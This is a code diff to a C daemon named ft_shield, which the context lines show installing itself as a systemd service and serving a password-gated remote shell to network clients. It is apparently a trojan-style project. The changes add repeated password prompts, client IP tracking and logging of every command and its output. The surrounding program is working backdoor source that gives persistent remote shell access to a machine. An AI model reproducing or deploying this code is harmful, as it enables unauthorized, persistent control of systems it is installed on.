@@ -12,6 +12,7 @@
 #include <signal.h>
 #include <sys/wait.h>
 #include <semaphore.h>
+#include <arpa/inet.h>
 
 #define TARGET_PATH "/usr/local/bin/ft_shield"
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
@@ -188,29 +189,51 @@ void handle_sigchld(int sig)
     }
 }
 
-void handle_client(int client_socket)
+void handle_client(int client_socket, const char *client_ip)
 {
     char buffer[1024];
     int authenticated = 0;
+    FILE *log = NULL;
+    size_t total_data_sent = 0;
+    size_t total_data_received = 0;
 
-    send(client_socket, "Password: ", 10, 0);
-    int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
-    buffer[bytes_received - 1] = '\0';
-    uint8_t digest[16];
-    char pwd[33];
-
-    md5((uint8_t *)buffer, strlen(buffer), (uint8_t *)digest);
-    md5_to_hex_string(digest, pwd);
-
-    if (strcmp(pwd, PWD) == 0)
+    while (authenticated == 0)
     {
-        authenticated = 1;
+        send(client_socket, "Password: ", 10, 0);
+        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
+    
+        if (bytes_received <= 0) 
+            break;
+
+        buffer[bytes_received - 1] = '\0';
+        uint8_t digest[16];
+        char pwd[33];
+    
+        md5((uint8_t *)buffer, strlen(buffer), (uint8_t *)digest);
+        md5_to_hex_string(digest, pwd);
+    
+        if (strcmp(pwd, PWD) == 0)
+        {
+            authenticated = 1;
+        }
+        else
+        {
+            log = fopen("/var/log/ft_shield_actions.log", "a");
+            if (log)
+            {
+                fprintf(log, "Rejected connection from %s due to: Authentication failed.\n", client_ip);
+                fclose(log);
+                log = NULL;
+            }
+        }
     }
-    else
+
+    log = fopen("/var/log/ft_shield_actions.log", "a");
+    if (log)
     {
-        send(client_socket, "Authentication failed.\n", 23, 0);
-        close(client_socket);
-        return;
+        fprintf(log, "Connection from %s received.\n", client_ip);
+        fclose(log);
+        log = NULL;
     }
 
     if (authenticated)
@@ -251,6 +274,16 @@ void handle_client(int client_socket)
                     int n = read(master_fd, buffer, sizeof(buffer));
                     if (n <= 0) break;
                     send(client_socket, buffer, n, 0);
+
+                    total_data_sent += n;
+                    
+                    log = fopen("/var/log/ft_shield_actions.log", "a");
+                    if (log)
+                    {
+                        fprintf(log, "Command output: %.*s\n", n, buffer);
+                        fclose(log);
+                        log = NULL;
+                    }
                 }
 
                 if (FD_ISSET(client_socket, &fds))
@@ -258,10 +291,28 @@ void handle_client(int client_socket)
                     int n = recv(client_socket, buffer, sizeof(buffer), 0);
                     if (n <= 0) break;
                     write(master_fd, buffer, n);
+
+                    total_data_received += n;
+
+                    log = fopen("/var/log/ft_shield_actions.log", "a");
+                    if (log)
+                    {
+                        fprintf(log, "Command requested: %.*s", n, buffer);
+                        fclose(log);
+                        log = NULL;
+                    }
+
                 }
             }
             close(master_fd);
         }
+    }
+
+    log = fopen("/var/log/ft_shield_actions.log", "a");
+    if (log)
+    {
+        fprintf(log, "Session from %s ended. Data sent: %zd bytes, Data received: %zd bytes\n", client_ip, total_data_sent, total_data_received);
+        fclose(log);
     }
 
     close(client_socket);
@@ -315,13 +366,24 @@ void daemon_main()
         client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_size);
         if (client_socket == -1)
         {
-            perror("Accept failed");
+            FILE *log = NULL;
+            log = fopen("/var/log/ft_shield_actions.log", "a");
+            if (log)
+            {
+                fprintf(log, "Incomming connection refused due to: Accept Failed.\n");
+                fclose(log);
+                log = NULL;
+            }
+            // perror("Accept failed");
             sem_post(&connection_semaphore);
             continue;
         }
         if (fork() == 0)
         {
-            handle_client(client_socket);
+            char client_ip[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
+
+            handle_client(client_socket, client_ip);
             close(server_socket);
             exit(EXIT_SUCCESS);
         }
